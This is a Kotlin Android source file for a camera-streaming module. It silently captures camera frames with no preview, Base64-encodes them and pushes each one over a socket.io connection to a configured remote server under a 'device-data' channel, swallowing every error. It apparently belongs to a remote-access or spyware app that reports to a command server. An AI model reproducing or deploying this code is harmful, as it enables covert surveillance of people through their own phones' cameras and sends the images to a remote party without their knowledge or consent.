package com.app.cyber

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject

object CameraStreamer {
    private var cameraDevice: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var reader: ImageReader? = null
    private var thread: HandlerThread? = null
    private var socket: Socket? = null

    fun start(ctx: Context, facing: Int) {
        try {
            val manager = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = manager.cameraIdList.firstOrNull { camId ->
                manager.getCameraCharacteristics(camId).get(CameraCharacteristics.LENS_FACING) == facing
            } ?: manager.cameraIdList.firstOrNull() ?: return

            thread = HandlerThread("cam").also { it.start() }
            val handler = Handler(thread!!.looper)

            reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 3)
            reader!!.setOnImageAvailableListener({ r ->
                val image = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buf = image.planes[0].buffer
                val bytes = ByteArray(buf.remaining())
                buf.get(bytes)
                image.close()
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                try {
                    if (socket == null || !socket!!.connected()) {
                        socket = IO.socket(Config.BaseUrl)
                        socket?.connect()
                    }
                    val p = JSONObject()
                    p.put("action", "camera_frame")
                    p.put("data", b64)
                    socket?.emit("device-data", p)
                } catch (_: Exception) {}
            }, handler)

            manager.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                    req.addTarget(reader!!.surface)
                    camera.createCaptureSession(listOf(reader!!.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            session = s
                            s.setRepeatingRequest(req.build(), null, handler)
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) {}
                    }, handler)
                }
                override fun onDisconnected(camera: CameraDevice) {}
                override fun onError(camera: CameraDevice, error: Int) {}
            }, handler)
        } catch (e: Exception) { }
    }

    fun stop() {
        try {
            session?.close(); cameraDevice?.close(); reader?.close(); thread?.quitSafely()
        } catch (_: Exception) {}
        session = null; cameraDevice = null; reader = null; thread = null
    }
}
